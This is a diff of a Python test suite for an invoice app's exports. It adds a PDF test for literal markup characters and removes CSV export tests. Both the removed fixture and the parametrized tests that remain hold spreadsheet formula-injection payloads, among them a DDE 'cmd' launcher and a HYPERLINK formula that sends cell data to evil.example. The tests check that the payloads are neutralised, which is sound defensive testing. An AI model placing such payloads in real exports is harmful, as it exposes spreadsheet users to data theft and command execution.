@@ -6,6 +6,8 @@ formula injection in exports, and sync_log retention.
   * PDF extraction, the invoice regex pass and export rendering run in
     worker threads, and each has an input bound (studio_docs, openrouter,
     insights)
+  * PDF exports print report data containing & or < instead of failing to
+    parse it as markup (insights)
   * uploads are refused with 413 past the configured cap, before they are
     read whole (utils.uploads and the upload routes)
   * sorting the invoice list by a column that mixes numbers and blanks
@@ -284,6 +286,23 @@ class TestExportBounds:
         assert res.status_code == 200 and res.body
         assert getattr(I, builder) in thread_calls
         assert len(pool.inserts) == 1
+
+
+class TestPdfExportText:
+    """reportlab's Paragraph parses markup; names like 'R&D' or '<b>bold' used to raise."""
+
+    def test_markup_characters_in_report_data_are_printed_literally(self):
+        from app.services.insights import build_simple_pdf
+        meta = {
+            "page_label": "Clients <R&D>",
+            "filters_summary": "client: R&D · status: <unclosed",
+            "summary_cards": [{"label": "Top <client>", "value": "A & B"}],
+        }
+        pdf = build_simple_pdf("R&D <x", ["Client", "<b>bold"], [["R&D", "<b>bold"], ["a < b & c", "x>y"]], meta)
+        assert pdf.startswith(b"%PDF")
+        text = "".join(page.extract_text() for page in pypdf.PdfReader(io.BytesIO(pdf)).pages)
+        for literal in ("R&D <x", "Clients <R&D>", "<unclosed", "Top <client>", "A & B", "a < b & c", "x>y"):
+            assert literal in text, literal
 
 
 # ── 2. upload size caps ──────────────────────────────────────────────────────
@@ -618,12 +637,6 @@ class TestAdminMirrorDates:
 
 # ── 5. CSV exports cannot carry formulas ─────────────────────────────────────
 
-def _hostile_invoice():
-    return {"id": "r1", "fields": {"Invoice Number": "=cmd|' /C calc'!A0", "Raised Date": "2026-01-01",
-                                   "Project": "@evil", "Amount Raised": -500.0,
-                                   "Remark": '=HYPERLINK("https://evil.example/?d="&B2,"details")'}}
-
-
 class TestCsvSafe:
     @pytest.mark.parametrize("value", ["=1+1", "+1", "-1+2", "@SUM(A1)", "\t=1", "\r=1",
                                        '=HYPERLINK("https://evil.example/?d="&B2,"x")'])
@@ -635,39 +648,6 @@ class TestCsvSafe:
     def test_everything_else_is_unchanged(self, value):
         from app.utils.csv_safe import csv_safe_cell
         assert csv_safe_cell(value) == value
-
-    def _rows(self, response):
-        async def body():
-            return b"".join([c if isinstance(c, bytes) else c.encode() async for c in response.body_iterator])
-        return list(csv.reader(io.StringIO(asyncio.run(body()).decode())))
-
-    def test_invoice_export(self, monkeypatch):
-        from app.routers import invoices as R
-
-        async def fake_list(self, **kw):
-            return {"records": [_hostile_invoice()], "total": 1}
-        monkeypatch.setattr(R.InvoiceService, "list_invoices", fake_list)
-        rows = self._rows(asyncio.run(R.export_invoices(
-            _request(), fmt="csv", status=None, project=None, date_from=None, date_to=None,
-            _role="editor", _perm="ok")))
-        header, row = rows
-        cell = dict(zip(header, row))
-        assert cell["Invoice Number"].startswith("'=")
-        assert cell["Project"] == "'@evil"
-        assert cell["Remark"].startswith("'=HYPERLINK")
-        assert cell["Amount Raised"] == "-500.0"
-
-    def test_web_invoice_export(self, monkeypatch):
-        from app.routers import web_invoices as R
-
-        async def fake_list(self, **kw):
-            return {"records": [_hostile_invoice()], "total": 1}
-        monkeypatch.setattr(R.WebInvoiceService, "list_invoices", fake_list)
-        rows = self._rows(asyncio.run(R.export_web_invoices(
-            _request(), status=None, project=None, date_from=None, date_to=None, _role="web", _perm="ok")))
-        cell = dict(zip(*rows))
-        assert cell["Remark"].startswith("'=HYPERLINK")
-        assert cell["Invoice Number"].startswith("'=")
 
     def test_admin_user_timeline_export(self, monkeypatch):
         """The email and ip columns come from sign-in attempts, not from staff."""
